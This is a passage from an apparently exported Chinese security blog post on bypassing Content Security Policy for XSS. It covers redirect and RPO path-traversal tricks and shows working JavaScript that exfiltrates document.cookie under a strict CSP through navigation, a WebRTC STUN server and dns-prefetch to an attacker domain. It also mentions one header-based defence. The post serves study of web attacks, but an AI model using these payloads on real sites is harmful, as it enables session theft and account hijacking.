class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/a/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/301.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>301.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.3.16/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>前两个因为csp策略被阻拦了，最后一个是一个允许的，并且是个重定向，但是只能重定向到csp规定的host，他只是不在看path了，但是host还是看的，如果是<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://abc.com/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>还是会被拦截</p>
<h1 id="RPO绕过"><a href="#RPO绕过" class="headerlink" title="RPO绕过"></a>RPO绕过</h1><p>如果CSP是允许<code>https://example.com/script/abc/</code><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://127.0.0.1/script/abc/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/script/abc/..%2f..%2ftest.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>那么上面的代码就可以绕过，但是这是要取决于后端服务器的处理，nginx和nodejs是可以的，其他没测试过，到时候可以看看</p>
<h1 id="其他种类的绕过"><a href="#其他种类的绕过" class="headerlink" title="其他种类的绕过"></a>其他种类的绕过</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// any JavaScript code</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p>
<ol>
<li><p>跳转</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>WebRTC<br>通过dns来获取数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>DNS prefetch<br>为了让加载速度更快，浏览器可以提前去解析一些标签的host为ip</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sessionid = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]+<span class="string">&quot;.&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">body.<span class="property">innerHTML</span> = body.<span class="property">innerHTML</span> + <span class="string">&quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot;</span> + sessionid + <span class="string">&quot;attacker.ch\&quot;&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以加上这个header用来防御<br><code>X-DNS-Prefetch-Control: off</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
</search>
